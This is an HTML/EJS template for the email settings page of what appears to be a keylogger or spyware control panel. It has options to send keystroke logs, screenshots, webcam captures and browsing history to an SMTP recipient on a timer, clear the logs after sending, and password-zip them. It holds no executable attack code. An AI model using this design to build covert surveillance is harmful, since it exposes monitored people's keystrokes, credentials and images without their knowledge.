<!DOCTYPE html>
<html lang="en">
<% include css/emailCss %>

    <body>
        <div class="content">
            <% include common/commonNavbar %>
                <form action="/email" method="post">
                    <div class="container">
                        <nav class="mt-5">
                            <div class="nav nav-tabs" id="nav-tab" role="tablist">
                                <a class="nav-item nav-link active" id="nav-general-tab" data-toggle="tab" href="#nav-general" role="tab" aria-controls="nav-general"
                                    aria-selected="true">General</a>
                                <a class="nav-item nav-link" id="nav-settings-tab" data-toggle="tab" href="#nav-settings" role="tab" aria-controls="nav-settings"
                                    aria-selected="false">Settings</a>
                            </div>
                        </nav>
                        <div class="col-md-12">
                            <div class="tab-content" id="nav-tabContent">
                                <div class="tab-pane fade show active" id="nav-general" role="tabpanel" aria-labelledby="nav-general-tab">
                                    <div class="offset-md-3">
                                        <div class="col-md-11 mb-4">
                                            <table class="mt-4">
                                                <tbody>
                                                    <tr>
                                                        <td>
                                                            <i class="fas fa-envelope icon-settings"></i>
                                                        </td>
                                                        <td class="pt-single-text">
                                                            <a data-toggle="collapse" href="#txtEnable">
                                                                Try to upload logs by Email every
                                                            </a>
                                                        </td>
                                                        <td class="pr-2 ml-5" style="float: right">
                                                            <label class="switch">
                                                                <input type="checkbox" name="enableEmail" id="enableEmail">
                                                                <span class="slider"></span>
                                                            </label>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td colspan="3">
                                                            <div class="collapse" id="txtEnable">
                                                                <div class="multi-text">
                                                                    <div class="pr-2">
                                                                        hours
                                                                    </div>
                                                                    <div class="form-group pr-2">
                                                                        <input type="text" class="form-control" name="hoursEmail" id="hoursEmail" aria-describedby="helpId" size="5">
                                                                    </div>
                                                                    <div class="pr-2">
                                                                        minutes
                                                                    </div>
                                                                    <div class="form-group pr-2">
                                                                        <input type="text" class="form-control" name="minutesEmail" id="minutesEmail" aria-describedby="helpId" size="5">
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <i class="fas fa-file icon-settings"></i>
                                                        </td>
                                                        <td class="pt-single-text">
                                                            Upload text logs (keystroke)
                                                        </td>
                                                        <td class="pr-2 ml-5" style="float: right">
                                                            <label class="switch">
                                                                <input type="checkbox" name="enableUploadKeystroke" id="enableUploadKeystroke">
                                                                <span class="slider"></span>
                                                            </label>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <i class="far fa-image icon-settings"></i>
                                                        </td>
                                                        <td class="pt-single-text">
                                                            Upload visual logs (Image)
                                                        </td>
                                                        <td class="pr-2 ml-5" style="float: right">
                                                            <label class="switch">
                                                                <input type="checkbox" name="enableUploadImage" id="enableUploadImage">
                                                                <span class="slider"></span>
                                                            </label>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <i class="fas fa-video icon-settings"></i>
                                                        </td>
                                                        <td class="pt-single-text">
                                                            Upload Webcam
                                                        </td>
                                                        <td class="pr-2 ml-5" style="float: right">
                                                            <label class="switch">
                                                                <input type="checkbox" name="enableUploadWebcam" id="enableUploadWebcam">
                                                                <span class="slider"></span>
                                                            </label>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <i class="fas fa-globe icon-settings"></i>
                                                        </td>
                                                        <td class="pt-single-text">
                                                            Upload Website
                                                        </td>
                                                        <td class="pr-2 ml-5" style="float: right">
                                                            <label class="switch">
                                                                <input type="checkbox" name="enableUploadWebsite" id="enableUploadWebsite">
                                                                <span class="slider"></span>
                                                            </label>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <i class="fas fa-ban icon-settings"></i>
                                                        </td>
                                                        <td class="pt-single-text">
                                                            <a data-toggle="collapse" href="#txtSizeUpload">
                                                                Size Upload
                                                            </a>
                                                        </td>
                                                        <td class="pr-2 ml-5" style="float: right">
                                                            <label class="switch">
                                                                <input type="checkbox" name="enableLimit" id="enableLimit">
                                                                <span class="slider"></span>
                                                            </label>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td colspan="3">
                                                            <div class="collapse" id="txtSizeUpload">
                                                                <div class="multi-text">
                                                                    <div class="pr-2">
                                                                        Limit the maximum attachment size
                                                                    </div>
                                                                    <div class="form-group pr-2">
                                                                        <input type="text" class="form-control" name="limitEmail" id="limitEmail" aria-describedby="helpId" size="5">
                                                                    </div>
                                                                    <div>
                                                                        KBs
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <i class="fa fa-trash icon-settings"></i>
                                                        </td>
                                                        <td class="pt-single-text">
                                                            Clear the logs after sending
                                                        </td>
                                                        <td class="pr-2 ml-5" style="float: right">
                                                            <label class="switch">
                                                                <input type="checkbox" name="enableClear" id="enableClear">
                                                                <span class="slider"></span>
                                                            </label>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <i class="fas fa-key icon-settings"></i>
                                                        </td>
                                                        </td>
                                                        <td class="pt-single-text">
                                                            <a data-toggle="collapse" href="#txtPassword">
                                                                Zip with password
                                                            </a>
                                                        </td>
                                                        <td class="pr-2 ml-5" style="float: right">
                                                            <label class="switch">
                                                                <input type="checkbox" name="enableZip" id="enableZip">
                                                                <span class="slider"></span>
                                                            </label>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td colspan="3">
                                                            <div class="collapse" id="txtPassword">
                                                                <div class="multi-text">
                                                                    <div class="pr-2">
                                                                        Password
                                                                    </div>
                                                                    <div class="form-group pr-2">
                                                                        <input type="text" class="form-control" name="passwordZipEmail" id="passwordZipEmail" aria-describedby="helpId" size="20">
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td colspan="3">
                                                            <div class="offset-md-5 pt-4">
                                                                <button type="submit" class="btn btn-success btn-lg">OK</button>
                                                                <button type="button" class="btn btn-danger btn-lg">
                                                                    <a class="cancel" href="/email">Cancel</a>
                                                                </button>
                                                            </div>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                                <div class="tab-pane fade" id="nav-settings" role="tabpanel" aria-labelledby="nav-settings-tab">
                                    <div class="offset-md-3">
                                        <div class="col-md-10 mb-4">
                                            <table class="mt-4">
                                                <tbody>
                                                    <tr>
                                                        <td class="pr-2">
                                                            SMTP Server
                                                        </td>
                                                        <td class="pt-single-text">
                                                            <div class="form-group pr-2">
                                                                <input type="text" class="form-control" name="smtpEmail" id="smtpEmail" aria-describedby="helpId" size="50">
                                                            </div>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td class="pr-2">
                                                            Username
                                                        </td>
                                                        <td class="pt-single-text">
                                                            <div class="form-group pr-2">
                                                                <input type="text" class="form-control" name="userEmail" id="userEmail" aria-describedby="helpId" size="50">
                                                            </div>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td class="pr-2">
                                                            Password
                                                        </td>
                                                        <td class="pt-single-text">
                                                            <div class="form-group pr-2">
                                                                <input type="password" class="form-control" name="passwordEmail" id="passwordEmail" aria-describedby="helpId" size="50">
                                                            </div>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td class="pr-2">
                                                            Subject
                                                        </td>
                                                        <td class="pt-single-text">
                                                            <div class="form-group pr-2">
                                                                <input type="text" class="form-control" name="subjectEmail" id="subjectEmail" aria-describedby="helpId" size="50">
                                                            </div>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td class="pr-2">
                                                            Send to
                                                        </td>
                                                        <td class="pt-single-text">
                                                            <div class="form-group pr-2">
                                                                <input type="text" class="form-control" name="sendTo" id="sendTo" aria-describedby="helpId" size="50">
                                                            </div>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td class="pr-2">
                                                            Port
                                                        </td>
                                                        <td class="pt-single-text">
                                                            <div class="form-group pr-2">
                                                                <input type="text" class="form-control" name="portEmail" id="portEmail" aria-describedby="helpId" size="50">
                                                            </div>
                                                        </td>
                                                    </tr>
                                                    <tr>
                                                        <td colspan="2">
                                                            <div class="offset-md-4 mt-4">
                                                                <button type="submit" class="btn btn-success btn-lg">OK</button>
                                                                <button type="button" class="btn btn-danger btn-lg">
                                                                    <a class="cancel" href="/email">Cancel</a>
                                                                </button>
                                                            </div>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </form>
        </div>
        <% include common/commonFooter %>
            <% include script/emailScript %>
    </body>

</html>